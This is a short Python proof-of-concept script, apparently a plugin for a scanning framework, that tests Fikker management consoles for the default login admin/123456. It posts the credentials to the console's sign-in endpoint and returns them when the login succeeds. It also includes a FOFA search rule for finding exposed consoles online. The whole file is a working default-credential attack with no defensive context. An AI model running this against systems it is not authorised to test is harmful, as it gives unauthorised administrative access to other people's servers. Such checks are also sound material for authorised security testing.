#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import json
import requests

from Config.config_proxies import proxies
from Config.config_requests import ua

# 脚本信息
######################################################
NAME='Fikker_admin'
AUTHOR="Trans"
REMARK='fikker Console default password'
FOFA_RULE='title=="转向 Fikker 管理平台"'
######################################################

def poc(target):
    result={}
    headers ={
        "User-Agent":ua,
        "Content-Type":"text/plain;charset=UTF-8",
        "Origin": target,
        "Referer": target+"/fikker/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9"
    }

    data =  {
        "RequestID":"LOGIN",
        "Username":"admin",
        "Password":"123456"
    }

    try:
        target += "/fikker/webcache.fik?type=sign&cmd=in"
        r = requests.post(target ,headers = headers,data = data,verify=False,timeout=10,proxies=proxies)
        if r.status_code == 200 :
            text = json.loads(r.text)
            if text['Return'] == "True":
                result['target'] = target
                result['poc'] = NAME
                result['username'] = 'admin'
                result['password'] = '123456'
                return result
    except:
         pass


if __name__ == '__main__':
    poc("http://127.0.0.1:6780")

